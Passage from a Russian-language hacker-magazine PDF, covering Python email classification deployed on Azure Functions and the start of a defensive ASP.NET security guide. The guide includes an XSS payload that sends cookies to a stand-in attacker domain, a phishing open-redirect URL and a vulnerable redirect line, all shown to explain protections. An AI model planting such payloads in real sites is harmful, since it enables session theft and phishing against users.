и Class. И поскольку в NLTK не предусмотрена встро енная поддержка чтения
данных из файлов в формате CSV, мы написа ли собственный модуль, поз‐
воляющий читать файлы из папки в виде одно го dataframe pandas или извле‐
кать текст в виде списков абза цев, предложений, слов и так далее в формате
NLTK.
  А вот код для инициализации этого самописного модуля чтения CsvCor‐
pusReader данными клиента. Реализацию клас са можно увидеть в файле
lib\corpus.py. Настоятельно рекомендую тебе озна комиться с содержимым
файла Experiments\TrainingExperiment.py.


#%% create corpus
corpus = CsvCorpusReader(".\data", ["data.csv"],
                         encoding="utf8",
                         default_text_selector=lambda row: row["Text"
])

По окончании инициализации нужно извлечь слова из документов и нор‐
мализовать их. В нашем случае после ряда экспериментов мы решили
использовать набор вспо могательных функций в качес тве обертки для всего
процесса, чтобы скрыть обращения к биб лиотекам NLTK и Gensim внутри
простого в использовании уровня конфигурации.
  Ниже мы даем экстрактору команду вернуть документы в виде спис ка слов,
отбрасывая структуру абзацев или предложений (см. keep_levels=Levels.
Nothing). Затем перево дим каждое слово в нижний регистр, отбрасываем
любые стоп‐слова и выделяем осно вы слов. На заключительном этапе уда‐
ляем низкочастотные сло ва, предполагая, что это просто опечатки или что
они не оказывают существенного влияния на клас сификацию.
  Обрати вни мание, что приведенный ниже код ори ентирован исключитель‐
но на выборки данных на английском языке, в то время как в оригинальной
версии была реализована рус ская лемматиза ция с использовани ем PyMor‐
phy2, что позволило добить ся более точной клас сификации для рус ского язы‐
ка.


#%% tokenize the text
stop_words = ['would', 'like', 'mcdonald']
text_processor = generate_processor(keep_alpha_only=True,
                                    to_lower=True,
                                    stopwords_langs=['english'],
                                    add_stopwords=stop_words,
                                    stemmer_langs=['english'])
docs_factory = lambda: corpus.words(keep_levels=Levels.Nothing, **
text_processor)
word_frequencies = Counter((word for doc in docs_factory() for word
in doc))
min_word_freq = 3
docs = [
    [
        word
        for word in doc if word_frequencies[word] >= min_word_freq
     ] for doc in docs_factory()
]

Как только мы токенизиру ем наш корпус, следующим шагом будет пос тро‐
ение вложения. Код ниже нужен, чтобы преобра зовать каждый документ в ряд
бессмысленных цифр для использования в классификаторе.
  Мы протестировали несколько раз ных подходов (включая BoW, TF‐IDF, LSI,
RP и w2v), но классическая модель LSI с 500 извлеченными топиками дала
наилучшие результаты (AUC = 0,98) в нашем случае. Для начала код проверя‐
ет наличие существующей сериализованной модели в общей папке. Если
модели нет, код обучает новую модель с использованием предварительно
подготовленных данных и сохраняет результат на диск. Если модель обна‐
ружена, она просто загружа ется в память. Затем код пре образовывает набор
данных и повторяет поток со следующим вложением.
  По эффективности модель LSI превзошла гораздо более мощ ный алго‐
ритм векторизации на базе word2vec и другие более сложные под ходы, и это
может быть обусловлено несколькими возможными при чинами.
  Самая очевидная из них связана с тем, что письма тех типов, которые мы
искали, имели предсказуемые и повторя ющиеся шаблоны слов, как в случае
автоответов (например, «Спасибо за ваше письмо... Меня не будет в офисе
до... Если вопрос срочный...»). Поэто му для их обра ботки вполне достаточно
чего‐то простого, например TF‐IDF. LSI поддержи вает общую идеологию,
и эту модель можно рассматривать как способ добавления синонимов, под‐
ходящих для обработки. В то же время алгоритм word2vec, прошедший обу‐
чение на Википедии, вероятно, генерирует ненужный шум из‐за сложных
синонимичных структур, тем самым «раз мывая» шаб лоны в сообщениях и,
следовательно, снижая точность классификации.
   Этот подход показал, что старые и довольно прос тые методы по‐прежнему
стоит пробовать, даже в эпоху word2vec и рекуррентных нейронных сетей.


#%% convert to Bag of Words representation
dictionary_path = os.path.join(preprocessing_path, 'dictionary.bin')
if os.path.exists(dictionary_path):
    dictionary = corpora.Dictionary.load(dictionary_path)
else:
    dictionary = corpora.Dictionary(docs)
    dictionary.save(dictionary_path)
docs_bow = [dictionary.doc2bow(doc) for doc in docs]
nested_partial_print(docs_bow)
#%% convert to tf‐idf representation
tfidf_path = os.path.join(preprocessing_path, 'tfidf.bin')
if os.path.exists(tfidf_path):
    model_tfidf = models.TfidfModel.load(tfidf_path)
else:
    model_tfidf = models.TfidfModel(docs_bow)
    model_tfidf.save(tfidf_path)
docs_tfidf = nested_to_list(model_tfidf[docs_bow])
#%% train and convert to LSI representation
lsi_path = os.path.join(preprocessing_path, 'lsi.bin')
lsi_num_topics = 500
if os.path.exists(lsi_path):
    model_lsi = models.LsiModel.load(lsi_path)
else:
    model_lsi = models.LsiModel(docs_tfidf, id2word=dictionary,
num_topics=lsi_num_topics)
    model_lsi.save(lsi_path)
docs_lsi = model_lsi[docs_tfidf]

Как всегда, от обязатель ного рутин ного кода избавиться невозможно. Даль‐
ше он нам пригодится при подготовке данных для машинного обучения с при‐
менением scikit‐learn.
   Как я уже говорил выше, мы используем несколько бинарных вместо одно‐
го многоклассового клас сификатора. Именно поэтому создаем бинарную
цель для одного из классов (в этом образце это SlowService). Ты можешь
изменять значение переменной class_to_find и выпол нять при веденный
ниже код повторно, чтобы обучить каж дый одноклассовый классификатор
в отдельности. Скрипт оценки сделан так, чтобы работать с несколькими
моделями, и автоматичес ки загружает их из выделенной папки. Наконец,
формируется обучающий и тес товый набор данных, строки с пропусками
при этом полностью исключаются.


#%% create target
class_to_find = "SlowService"
df["Target"] = df.apply(lambda row: 1 if class_to_find in row["Class"
] else 0, axis=1)
df.groupby(by=["Target"]).count()
#%% create features and targets dataset
features = pd.DataFrame(docs_features, columns=["F" + str(i) for i in
 range(lsi_num_topics)])
notnul_idx = features.notnull().all(axis=1)
features = features[notnul_idx]
df_notnull = df[notnul_idx]
target = df_notnull[["Target"]]
plot_classes_scatter(features.values, target["Target"].values)
#%% split dataset to train and test
train_idx, test_idx = train_test_split(df_notnull.index.values,
test_size=0.3, random_state=56)
df_train = df_notnull.loc[train_idx]
features_train = features.loc[train_idx]
target_train = target.loc[train_idx]
df_test = df_notnull.loc[test_idx]
features_test = features.loc[test_idx]
target_test = target.loc[test_idx]

Теперь приступаем к обучению клас сификатора (в нашем случае это логис‐
тическая регрессия), потом сохраним модель в том же общем каталоге,
который использовали ранее для встраивания преобразований.
   Как ты мог заметить, в приведенном ниже коде мы придерживаемся спе‐
циального формата имени модели: class_{0}_thresh_{1}.bin. Это необ‐
ходимо для определения имени клас са и соответству юще го порогового зна‐
чения в ходе дальнейшей оценки.
  И последнее замечание, прежде чем мы продолжим. В качестве инстру‐
мента разработки я выбрал Visual Studio Code. Это простой в использовании
легковесный редактор, который даже предоставляет базовые воз можнос ти
IntelliSense (автозавершение кода и подсказ ки) для такого динамичного язы‐
ка, как Python. В то же время рас ширения Jupyter и Python в сочетании
с ядром IPython позволяют выполнять код поячеечно и визуализировать
результат без повторного запуска скрипта, что всег да удобно для задач ML.
Да, это похоже на стандартный Jupyter, но с IntelliSense и ориентацией
на код/git. Я рекомендую тебе попробовать, хотя бы пока ты работаешь
с образцом, посколь ку для продуктивной разработ ки тут применяется мно‐
жество других возможнос тей, связанных с VS Code.
   Что касается кода ниже, строка с plot ROC threshold values — это при‐
меры использования расширения Jupyter. Ты можешь нажать спе циальную
кнопку Run cell (Выполнить ячейку) над ячей кой, чтобы увидеть значения TP
и FP и сравнить их с пороговым зна чением Threshold на панели результатов
справа. Мы активно использовали эту диаграмму во время работы, поскольку
из‐за выраженного дис баланса в наборе данных оптимальный уровень
отсечки всегда был около 0,04 вмес то привычных 0,5. Если ты не можешь
использовать VS Code для тестирования, можно просто запустить скрипт
с помощью стандартных инстру ментов Python и после просмотра результатов
в отдельном окне внести изменения непос редс твенно в имя файла.


#%% train logistic classifier
classifier = LogisticRegression()
classifier.fit(features_train, target_train)
#%% score on test
scores_test = classifier.predict_proba(features_test)[:, 1]
#%% plot ROC threshold values
pd.DataFrame(nested_to_list(zip(tsh, tp_test, fp_test, fp_test‐
tp_test)), columns=['Threshold', 'True Positive Rate', 'False
Positive Rate', 'Difference']).plot(x='Threshold')
plt.xlim(0, 1)
plt.ylim([0,1])
plt.grid()
plt.show()
#%% save model
threshold = 0.25
model_filename = 'class_{0}_thresh_{1}.bin'.format(class_to_find,
threshold)
joblib.dump(classifier, os.path.join(model_path, model_filename))

Теперь настало время скрип та оценки: Score\run.py. Нового в нем очень
мало, большую часть кода взяли из первоначального обучающего экспе‐
римента, рассмотренного ранее. Озна комь ся с содержимым этого фай ла
в репозитории GitHub.
  На вход подается файл CSV для оценки, на выходе получаем два разных
файла, один содержит оцененные клас сы, другой — идентификаторы строк,
оценить которые не представляется возможным. Я объясню причину исполь‐
зования файла позже, ког да будем говорить об операционализации.
  В конце этого раздела хочу пояснить, почему мы используем несколько
бинарных вместо одного мно гоклассового клас сификатора. Во‐первых, так
было гораздо проще начать, чтобы работать и оптимизировать произво‐
дительность на классах по отдельнос ти. Такой подход также позволя ет
использовать различные математические модели для раз ных классов, как в
случае с автоответами, которые час то имеют довольно жесткую структуру,
и их можно обрабатывать с помощью простого bag of words. В то же время,
с точки зрения ИТ‐специалиста, что‐то наподобие кода ниже может упростить
развертывание, позволив подключать новые или менять существу ющие
модели, не затрагивая другие.


model_paths = [path for path in os.listdir(os.path.join('..', 'model'
)) if path.startswith('class_') ]
for model_path in model_paths:
    model = joblib.load(os.path.join('..', 'model', model_path))
    res = model.predict_proba(features_notnull)[:, 1]
    class_name = model_path.split('_')[1]
    threshold = float(model_path.rsplit('.', 1)[0].split('_')[‐1])
    result.loc[:, "class_" + class_name] = res > threshold
    result.loc[:, "class_" + class_name + "_score"] = res

Ты даже можешь опробовать код пря мо сейчас, используя собс твенные дан‐
ные со своего локального ПК, и совсем без операционализации:
 • клонируй репозиторий, следуй инс трукциям по разверты ванию локальной
   среды Anaconda и уста нови Visual Studio Code с нужным расширением;
 • помести свои данные в поддерживаемом формате в файл data\data.
  csv и открой файл Experiment\TrainingExperiment.py , чтобы обу‐
   чить модель на любом клас се, который ты хочешь оценить;
 • не забудь предварительно уда лить всю папку models, поскольку в против‐
  ном случае код попытается повторно исполь зовать преобразования
   и модели из образца;
 • перейди к Score\run.py , замени данные в фай ле Score\debug\in
  put.csv собственными и пос трочно выполни скрипт с помощью рас‐
  ширения Jupyter.

В VS Code ты даже можешь открыть раздел отладки Debug (Ctrl + Alt + D), выб‐
рать Score (Python) в качестве конфигура ции и нажать  Start Debugging
(Выполнить отладку), чтобы провес ти пос трочный анализ кода в редакторе.
Когда алгоритмы завер шат свою работу, результаты можно будет найти
в файлах input.scores.csv и input.unscorable.csv в папке Score\debug.


             INFO

                     Реализовал интересный про ект? Думаешь, что он
                        стоит того, чтобы поделиться им с читателями?
                    Пиши нам в Хакер, крутую статью сделаем!





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

    PYTHON’ОМ ПО МАШИНЛЕРНИНГУ
                             РАЗГРЕБАЕМ ТОННЫ
                 ВХОДЯЩЕЙ КОРРЕСПОНДЕНЦИИ
                          БЕЗ УЧАСТИЯ ЧЕЛОВЕКА





ОПЕРАЦИОНАЛИЗАЦИЯ
Поддержка Python в Azure Functions до сих пор находится в раннем preview,
поэтому использование его для mission critical задач нежелательно. Но часто
ML к таким не относится, а потому удобство реализации может переве сить
сложности с адаптацией предварительной версии.
   Итак, на этом этапе у нас было два скрипта. Скрипт Experiments\TraintEx‐
periment.py обучает модель, затем преобра зованную и обу ченную модель он
сохраняет в общий каталог, и, как предполага ется, этот обучающий скрипт
перезапускается на локальной машине по мере необходимости. Скрипт
Score\run.py выполняется ежедневно, он сортиру ет новые электронные пись‐
ма по мере поступле ния.
  В  этом  разделе мы  поговорим  об  операционализации  процесса
с помощью Azure Functions. Функции просты в исполь зовании, они позволяют
привязать скрипт к множес тву различных триг геров (HTTP, очереди, BLOB‐
объекты хранилища, WebHooks и так далее), предоставля ют несколько авто‐
матических привязок вывода и при этом стоят недорого: выбрав план Con‐
sumption, ты платишь всего 0,000016 доллара за каждый используемый
гигабайт ОЗУ в секунду. Но здесь есть ограничения: твоя функция не может
выпол няться дольше десяти минут и использовать более 1,5 Гбайт ОЗУ. Если
тебя это не устраивает, ты всег да можешь перей ти на специальный тариф ный
план на базе App Service, сохранив при этом дос туп к другим пре имущес твам
serverless‐подхода. Однако для нашей прос той логистической регрессии
и пакетов из несколь ких сотен писем выбранный план оказал ся оптимальным.
  С точки зрения программиста, функция — это папка, которая носит имя
самой функции (в нашем случае это прос то Score) и содержит два раз ных
файла:
 • function.json — это файл, описыва ющий конфигурацию функции (фор‐
   мат см. здесь);
 • run.py — это Python‐скрипт, который запускается при срабаты вании
   триггера.

Function.json можно создать вручную или сконфигури ровать средствами пор‐
тала Azure. Код, который мы получили в данном случае, представлен ниже.
Первая привязка — inputcsv — запускает скрипт каждый раз, когда файл
с именем, соответствующим шаб лону mail‐classify/input/{input_file_‐
name}.csv, появляется в выбранном по умолчанию BLOB‐хранилище Azure.
Оставшиеся две привязки сохраня ют выходные фай лы после успешного
выпол нения функции. В данном случае мы сохраня ем их в отдельную папку
output, их имена соответству ют имени входного файла с суффиксами scored
или unscorable. Таким образом, ты можешь поместить файл с любым име‐
нем‐идентификатором, нап ример GUID, в папку input, и два новых файла
с именем, производным от GUID, через какое‐то время появятся в папке out‐
put.


{
  "bindings": [
    {
      "name": "inputcsv",
      "type": "blobTrigger",
      "path": "mail‐classify/input/{input_file_name}.csv",
      "connection": "apmlstor",
      "direction": "in"
    },
    {
      "name": "scoredcsv",
      "type": "blob",
      "path": "mail‐classify/output/{input_file_name}.scored.csv",
      "connection": "apmlstor",
      "direction": "out"
    },
    {
      "name": "unscorablecsv",
      "type": "blob",
      "path": "mail‐classify/output/{input_file_name}.unscorable.csv"
,
      "connection": "apmlstor",
      "direction": "out"
    }
  ],
  "disabled": false
}

Скрипт run.py для функций Azure практичес ки аналогичен нашей пер‐
воначальной «неоперационализованной» версии. Единственное изме нение
касается того, как функции пропус кают через себя входящие и исходящие
потоки данных. Независимо от выбранного типа входных и выходных данных
(HTTP‐запрос, сооб щение в очереди, BLOB‐файл...) содержимое будет хра‐
ниться во временном файле, и путь к нему будет записан в переменную сре‐
ды с именем соответствующей привяз ки. Например, в нашем случае при каж‐
дом выполнении функции создастся файл с именем ...\Binding\[GUID]\
inputcsv и этот путь будет хра нить ся в переменной сре ды inputcsv. Ана‐
логичная операция выполнится для каж дого исходяще го файла. Учитывая эту
логику, мы внесли несколь ко небольших изменений в скрипт.


# read file
input_path = os.environ['inputcsv']
input_dir = os.path.dirname(input_path)
input_name = os.path.basename(input_path)
corpus = CsvCorpusReader(input_dir, [input_name],
                         encoding="utf8",
                         default_text_selector=lambda row: row["Text"
])
[...]
# write unscorables
unscorable_path = os.environ['unscorablecsv']
ids_null.to_csv(unscorable_path, index=False) # pandas DataFrame
[...]
# write scored emails
output_path = os.environ['scoredcsv']
result.to_csv(output_path) # pandas DataFrame

Это все изменения, необходимые для запус ка служ бы при появлении файла
CSV в BLOB‐хранилище и получения в результате файлов, содержащих прог‐
ноз.
   Если честно, мы тестировали и другие триггеры, но обнаружили, что самая
мощная функция Python — модули — ста новится ее прокляти ем в бессервер‐
ной системе. Модуль в Python — это не статическая библиотека, которую
нужно подключить, как во многих дру гих язы ках, а код, выполняемый при каж‐
дом запуске. Для таких долгосрочных решений, как службы, это почти
незаметно, но с точ ки зрения функций Azure полное выполнение скрипта каж‐
дый раз влечет за собой довольно большие расходы. Это осложня ет исполь‐
зование триггеров HTTP в Python, но batch‐обра бот ка на базе CSV‐фай лов,
популярная во многих ML‐сценариях, позволяет снизить эти расходы в рас‐
чете на строку данных до разумного минимума.
   Если ты не можешь обойтись без триггеров реаль ного времени с Python,
ты можешь попытаться перейти на выделен ный тарифный план Azure App Ser‐
vice, поскольку это позволяет зна читель но увеличить вычислительные ресур‐
сы хоста и уско рить импорт. В нашем случае прос тота реализации и низкая
стоимость плана потребления перевесили преиму щества быстрого выпол‐
нения.
  Прежде чем продолжить, давай пос мотрим, как можно упростить раз‐
работку с помощью Visual Studio Code. На момент написания этой статьи
интерфейс Functions CLI обеспечивал начальное формирование шаблонов
Python, но функций отладки не было. Тем не менее сре ду выполнения не так
сложно имитировать, используя встроенные функции VS Code. Нам поможет
файл .vscode\launch.json, позволя ющий настраивать параметры отладки.
Как видно из JSON ниже, при запус ке debug в конфигурации Score (Python)
мы просим VS Code выполнить отладку скрипта ${workspaceRoot}/Score/
run.py с рабочим каталогом ${workspaceRoot}/Score, кроме того, мы зада‐
ем переменные среды для трех файлов‐макетов с привязками. Это пол‐
ностью имитирует то, как эта функция будет выполняться с помощью Azure
Functions (не забывай проверить текущий рабочий каталог при раз работке
скрипта). При наличии этих нас троек ты можешь просто открыть раздел
отладки Debug (Ctrl + Alt + D) в VS Code, выб рать Score (Python) в качестве
конфигурации и нажать  Start Debugging, чтобы построчно прогнать код
в редакторе.


[...]
{
    "name": "Score (Python)",
    "type": "python",
    "request": "launch",
    "stopOnEntry": true,
    "pythonPath": "${config:python.pythonPath}",
    "console": "integratedTerminal",
    "program": "${workspaceRoot}/Score/run.py",
    "cwd": "${workspaceRoot}/Score",
    "env": {
        "inputcsv": "${workspaceRoot}/Score/debug/input.csv",
        "outputcsv": "${workspaceRoot}/Score/debug/output.csv",
        "unscorablecsv": "${workspaceRoot}/Score/debug/unscorable.
csv"
    },
    "debugOptions": [
        "RedirectOutput",
        "WaitOnAbnormalExit"
    ]
}
[...]

Если  ты хочешь  исполь зовать рас ширение  Jupyter  для  интерактивной
поячеечной разработки и выполнения, тебе нужна аналогичная конфигурация
в коде функции. Поэкспериментировав, мы оста новились на варианте кода
ниже. Он выполняется только в среде IPython, а при нормальном выполнении
или отладке через Debug игнорируется.


if "IPython" in sys.modules and 'Score' not in os.getcwd():
    os.environ['inputcsv'] = os.path.join('debug', 'input.csv')
    os.environ['scoredcsv'] = os.path.join('debug', 'input.scores.
csv')
    os.environ['unscorablecsv'] = os.path.join('debug', 'input.unscor
able.csv')
    os.chdir('Score')


КОНФИГУРАЦИЯ СРЕДЫ
Теперь, когда у нас есть готовая модель и код функции, пришло вре мя нас‐
троить нужную инфраструктуру Azure. На момент написания этой статьи под‐
держка Python в функциях Azure все еще находилась на этапе предваритель‐
ной версии, поэтому требова лись допол нительные шаги по настройке.
По умолчанию в среде выполнения уста новлен Python версии 2.7. Чтобы
перейти на более популярную версию 3.6, в соответствии с официальной
статьей в wiki тебе нужно получить любой дос тупный пакет Python (можно
использовать подготовленную среду) и помес тить его в папку D:\home\site\
tools. Все работает дос таточно просто. Эта папка предшествует папке
с установленным по умолчанию Python 2.7 в переменной PATH в момент
поиска python.exe для исполнения.
  Ты можешь сделать это вручную с помощью встроенного пользователь‐
ского интерфейса Kudu, как показа но в статье, одна ко я выяснил, что предус‐
мотренная для него специальная функция более удобна. Функция setup
показывает, как мы это делали во время работы над проектом. Сначала фун‐
кция проверяет, установлена ли версия 3.6, если нет, то она загружает пред‐
варительно скон фигурированный архив (.zip) с Python и извлекает его в папку
D:\home\site\tools.


tools_path = 'D:\\home\\site\\tools'
if not sys.version.startswith('3.6'):
    # in python 2.7
    import urllib
    print('Installing Python Version 3.6.3')
    from zipfile import ZipFile
    if not os.path.exists(tools_path):
        os.makedirs(tools_path)
        print("Created [{}]".format(tools_path))
    python_url = 'https://apmlstor.blob.core.windows.net/wheels/
python361x64.zip'
    python_file = os.path.join(tools_path, 'python.zip')
    urllib.urlretrieve(python_url, python_file)
    print("Downloaded Python 3.6.3")
    python_zip = ZipFile(python_file, 'r')
    python_zip.extractall(tools_path)
    python_zip.close()
    print("Extracted Python to [{}]".format(tools_path))
    print("Please rerun this function again to install required pip
packages")
    sys.exit(0)

Далее нужно установить требуемые пакеты pip. Pip имеет встроенный API
для Python, поэтому работать с ним из Python так же просто, как в обычной
командной строке. Из кода ниже видно, что используемые только в Python
пакеты (langid, pymorphy) уста новлены, поэтому от нас не тре буется никаких
дополнительных действий. Проблема возникнет лишь с пакетами, созданны‐
ми с помощью C++. В платформе App Service отсутствует компилятор Visual
C++, поэтому остается только использовать предварительно скомпилирован‐
ные пакеты (wheels). Некоторые из них уже присутс твуют в репозитории pip
(проверить можно здесь), для дру гих специфичных ML‐пакетов можно найти
необходимый wheel здесь. В данном случае я использовал Azure Blob Storage,
чтобы сде лать эти пакеты доступными для функции Azure. Ты можешь пов‐
торно использовать эти ссылки или перевыложить их в любое публично дос‐
тупное хранилище.


def install_package(package_name):
    pip.main(['install', package_name])
install_package('https://apmlstor.blob.core.windows.net/wheels/
numpy‐1.13.1%2Bmkl‐cp36‐cp36m‐win_amd64.whl')
install_package('https://apmlstor.blob.core.windows.net/wheels/
pandas‐0.20.3‐cp36‐cp36m‐win_amd64.whl')
install_package('https://apmlstor.blob.core.windows.net/wheels/
scipy‐0.19.1‐cp36‐cp36m‐win_amd64.whl')
install_package('https://apmlstor.blob.core.windows.net/wheels/scikit
_learn‐0.18.2‐cp36‐cp36m‐win_amd64.whl')
install_package('https://apmlstor.blob.core.windows.net/wheels/
gensim‐2.3.0‐cp36‐cp36m‐win_amd64.whl')
install_package('https://apmlstor.blob.core.windows.net/wheels/
nltk‐3.2.4‐py2.py3‐none‐any.whl')
install_package('langid')
install_package('pymorphy2')

Этот же подход оказался эффективен для выполнения допол нительных шагов
после настройки. Что бы наше решение работа ло, нужно установить два кор‐
пуса, специфичных для NLTK. Приведенный ниже код выполняется сразу пос‐
ле набора команд install_packages.


import nltk;
nltk_path = os.path.abspath(os.path.join('..', 'lib', 'nltk_data'))
if not os.path.exists(nltk_path):
    os.makedirs(nltk_path)
    print("INFO: Created {0}".format(nltk_path))
nltk.download('punkt', download_dir=os.path.join('..', 'lib', 'nltk_d
ata'))
nltk.download('stopwords', download_dir=os.path.join('..', 'lib',
'nltk_data'))

Поскольку весь код в функции Setup идемпотентный, ты можешь без проблем
добавить другие этапы настройки или уста новить допол нительные пакеты.
Обрати внимание, что в первый раз эта функция должна запуститься дважды:
сначала, чтобы перейти на Python 3.6, а затем, чтобы установить нужные
пакеты.


ЗАКЛЮЧЕНИЕ
Несмотря на сложные нас тройки и огра ничения, связанные с предваритель‐
ным  запуском,  Azure  Functions  показали  себя  как  довольно  удобный
и эффективный инструмент операционализа ции ML‐моделей Python. Наш
первоначальный проект был развернут в производс твенной среде, и модель
ML помогла значительно улучшить результаты по сравнению с уже существу‐
ющими подходами.


        WWW

                      Код для изучения и повторно го использования
                      доступен в репозитории на GitHub.
КОДИНГ


КАК НЕ ДОПУСТИТЬ
MASS ASSIGNMENT,
XSS, CSRF, CLICK‐
JACKING, MIME
SNIFFING, SQL IN‐
JECTION И
МНОГОГО
ДРУГОГО





                                                                            Алексей Соммер
                                                                                    asommer@yandex.ru
   ASP.NET
   ПОД ЗАЩИТОЙ




ASP.NET MVC — не самый хайповый, но довольно популяр‐
ный  стек  в среде веб‐разработчиков. С  точки зрения
(анти)хакера, его стандартная функциональность дает тебе
кое‐какой базовый уровень безопасности, но для предох‐
ранения от абсолютного большинства хакерских трю ков нуж‐
на дополнительная защита. В этой статье мы рассмотрим
основы, которые должен знать о безопасности ASP.NET‐раз‐
работчик (будь то Core, MVC, MVC Razor или Web Forms).


Начнем со всем известных видов атак.


SQL INJECTION
Как ни странно, но в 2017 году injection и, в частнос ти, SQL injection находятся
на первом месте среди «Toп‐10 рисков безопас ности OWASP» (Open Web Ap‐
plication Security Project). Этот вид атаки подразумевает, что введенные поль‐
зователем данные используются на серверной сто роне в качестве парамет‐
ров запроса.
  Пример классической SQL‐инъекции скорее характерен именно для при‐
ложений Web Forms. От атак помога ет защитить ся использование парамет‐
ров в качестве значений запроса:


string commandText = "UPDATE Users SET Status = 1 WHERE CustomerID =
@ID;";
SqlCommand command = new SqlCommand(commandText, connectionString);
command.Parameters["@ID"].Value = customerID;

Если ты разрабатываешь MVC‐приложение, то Entity Framework прикрывает
некоторые уязвимости. Получить сработавшую в MVC/EF‐приложе нии SQL‐
инъекцию нужно умудрить ся. Одна ко это возможно, если ты выпол няешь
SQL‐код с помощью ExecuteQuery или вызываешь плохо написанные хра‐
нимые процедуры.
  Несмотря на то что ORM поз воляет избежать SQL‐инъекции (за исклю‐
чением приведенных выше примеров), рекомендуется ограничивать атри‐
бутами значения, которые могут принимать поля модели, а значит, и формы.
Например, если подразумевается, что в поле может быть вве ден только
текст, то с помощью Regex ука жи диапа зон ^[a‐zA‐Z]+$. А если в поле дол‐
жны быть введены цифры, то ука жи это как требова ние:


[RegularExpression(@"\d{5}", ErrorMessage = "Индекс должен содержать
5 цифр")]
public  string Zip {  get;  set; }

В Web Forms ограничить зна чения можно с помощью валидаторов. Пример:


<asp:TextBox id="txtName" runat="server"></asp:TextBox>
<asp:RegularExpressionValidator id="nameRegex" runat="server" Contro
lToValidate="txtName"
    ValidationExpression="^[a‐zA‐Z'.\s]{1,40}$" ErrorMessage=
"Ошибочное значение в поле имени" />

Начиная с .NET 4.5 Web Forms используют Unobtrusive Validation. А это значит,
что не требуется писать какой‐то дополнительный код для проверки значения
формы.
  Валидация данных, в час тности, может помочь защититься от еще одной
всем известной уязвимос ти под наз ванием cross‐site scripting (XSS).


XSS
Типичный пример XSS — добавление скрипта в комментарий или запись
в гостевую книгу. Выглядеть он может так:


<script>document.location='https://verybadcoolhacker.com/?cookie='+
encodeURIComponent(document.cookie)</script>

Как ты понимаешь, в данном примере куки с тво его сайта передаются
в качестве параметра на какой‐то хакерский ресурс.
  В Web Forms можно совершить ошиб ку с помощью примерно такого кода:


<p>Извините <%= username %>, но пароль ошибочный</p>

Понятно, что вместо username может быть скрипт. Чтобы избежать выпол‐
нения скрип та, можно как минимум использовать дру гое ASP.NET‐выраже ние:
<%: username %>, которое энко дит свое содержимое.
   Если мы используем Razor, то строки автоматически энкодируются, что
сводит возможность реализации XSS к минимуму — хакер сможет ее провер‐
нуть, только если ты гру бо ошибешь ся, например используешь @Html.Raw(
Model.username) или заюзаешь в сво ей модели MvcHtmlString вместо
string.
  Для дополнительной защиты от XSS данные кодируются еще и в коде C#.
В .NET Core можно использовать следующие кодеры из пространс тва имен
System.Text.Encodings.Web: HtmlEncoder, JavaScriptEncoder и UrlEn‐
coder.
  Следующий пример вернет строку <script>:


string encodedString = HtmlEncoder.Default.Encode("<script>");

В классическом .NET используется HttpUtility.HtmlEncode. А начиная
с .NET 4.5 можно сделать AntiXssEncoder энко дером по умолчанию. Дела‐
ется это добавлением в тег httpRuntime файла web.config одного атрибута:


<httpRuntime targetFramework="4.7" encoderType="System.Web.Security.
AntiXss.AntiXssEncoder" />

Таким образом, сохранив старый код HttpUtility.HtmlEncode, мы будем
пользоваться новым и более стойким к уяз вимостям классом (также в новом
коде будут задействованы ста рые классы HttpServerUtility и HttpRespon‐
seHeader).
  Рекомендуется кодировать строки не перед сохранением в базу, а перед
отображением. Кроме того, если мы используем какую‐то строку, введенную
пользователем, в качес тве парамет ра для передачи в URL, то обязательно
нужно юзать UrlEncoder.


CROSS-SITE REQUEST FORGERY (CSRF)
Википедия в «алиэкспрес совском» стиле утвержда ет, что на русском CSRF
звучит как «межсайтовая подделка запроса». При таком типе атаки вредонос‐
ный сайт, на который заходит пользователь, отправляет запросы на дру гой
ресурс. На хороший  сайт,  на котором  поль зователь  зарегистрирован
и который он недавно посещал. Может случиться  так, что информация
об авторизации на хорошем сайте все еще оста ется в cookie. Тогда вполне
может быть совер шено и какое‐то скрытое вредоносное действие.
  Избежать этой атаки в MVC помога ет всем известный хел пер @Html.An‐
tiForgeryToken(), добавленный во View, и добавленный перед action кон‐
троллера атрибут [ValidateAntiForgeryToken]. Этот способ защиты отно‐
сится к типу STP (synchronizer token pattern). Суть в том, что при заходе
на страницу сервер отправляет пользователю токен, а после того, как поль‐
зователь совершает запрос, он вместе с данными отправляет токен серверу
обратно для проверки. Токены могут сохраняться как в заголовке, так и в
скрытом поле или в кукисах.
   Страницы Razor защищены от XSRF/CSRF‐атак по умол чанию. А вот если
мы используем AJAX‐запросы,  то  есть возможность отправить токены
в заголовке. По сравнению с использованием AntiForgeryToken это не так
просто. Для настрой ки этой возможности ASP.NET Core использует сервис
Microsoft.AspNetCore.Antiforgery.IAntiforgery. Клас сические ASP.NET‐приложе‐
ния используют метод AntiForgery.GetTokens для генерации токенов и An‐
tiForgery.Validate для проверки полученных серверной стороной токенов.
  Подробнее можно почитать здесь: Anti‐CSRF and AJAX.


OPEN REDIRECT ATTACKS
Будь осторожен с редиректами! Следующий код очень опасен:


Response.Redirect(Request.QueryString["Url"]);

Атакующий может добавить ссылку на свой сайт. А пользователь же, увидев,
что URL начинается с хорошего сайта, может не рассмотреть адрес пол‐
ностью (особенно если он длинный) и кликнуть ссылку, таким образом перей‐
дя на вредоносный сайт с твоего, хорошего (у тебя же хорошие сай ты?). Эта
уязвимость может использоваться, в частнос ти, для фишинга. Пример
фишинговой ссылки:


http://www.goodwebsite.com/Redirect?url=http://www.badwebsite.com

Многие пользователи, получив email со ссылкой, смотрят, совпадает ли
домен, и совсем не ожидают переб роски на злодейский ресурс. А если
по редиректу откроется стра ница с таким же дизайном, то многие поль‐
зователи не задумываясь введут свои логин и пароль (решив, что случайно
вышли из аккаунта). После чего, кстати, могут быть перенаправлены зло‐
умышленниками обратно на настоящий сайт.
   Этот вид атак касается и MVC. В следующем примере происходит провер‐
ка на то, является ли ссылка локальной:


private ActionResult RedirectToLocalPage(string redirectUrl)
{
    if (Url.IsLocalUrl(redirectUrl))  return Redirect(redirectUrl);
    // ...
}

Для защиты от этого типа атак можно использовать и вспомогательный метод
LocalRedirect:


private ActionResult RedirectToLocalPage(string redirectUrl)
{
    return LocalRedirect(redirectUrl);
}

В общем, старайся никогда не доверять полученным данным.


MASS ASSIGNMENT
Разберем эту уязвимость на примере. Допустим, в нашем веб‐сайте есть
простая модель с двумя свойства ми:


public class UserModel
{
  public string Name { get; set; }
  public bool IsAdmin { get; set; }
}

И есть обычная и довольно простая вьюшка:


@model UserModel
